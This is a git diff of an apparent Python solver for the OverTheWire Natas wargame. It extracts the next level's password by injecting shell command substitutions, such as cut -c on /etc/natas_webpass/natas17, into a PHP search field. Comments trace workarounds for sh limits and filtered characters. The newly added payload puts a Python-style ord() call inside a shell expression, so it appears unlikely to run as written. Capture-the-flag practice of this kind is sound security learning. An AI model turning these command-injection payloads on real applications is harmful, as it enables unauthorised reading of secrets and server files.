@@ -1,5 +1,5 @@
 from base64 import b64encode
-from itertools import chain
+
 import requests
 
 idx = 1
@@ -30,7 +30,7 @@ while idx < 32:
         #match = getMatch("^$(xxd -p -r <(echo $((61 + $(cut -c%i /etc/natas_webpass/natas17) )) ))" % idx)
         #print(f"mapping first char of %s to number" % match)
         #match = str(letter2Number[match[0].lower()])
-        # doesnt work, maybe xxd is not installed?
+        # doesnt work because process substitution is not available in sh
 
         # process substitution with <( seems not to work in sh (whats most probably used in php passthru ...)
         # match = getMatch("^$(tr -d \\n < <(head -n$(cut -c%i /etc/natas_webpass/natas17) <(yes .)))$" % idx)
@@ -43,8 +43,9 @@ while idx < 32:
     else:
         # alpha char matched, but case not known yet
         match = match[0]
-        # head -n3 <(yes .) | tr -d \\n
-        # match = findMatch(^$(head -n$(floor(ord(match))/10) <(yes .) | tr -d \\n)$) => len(match[0]) in (6,7,8,9) ? upper : lower
+        # printf %d \'A => ' is not allowed
+        # echo a | od -A n -t d1 => pipe not allowed
+        withCase = getMatch("^$(printf .%.0s $(( ord($(cut -c"+str(idx)+" /etc/natas_webpass/natas17)) / 10 )))$") # => len(withCase[0]) in (6,7,8,9) ? upper : lower
     pw += match
     print(pw)
     idx += 1
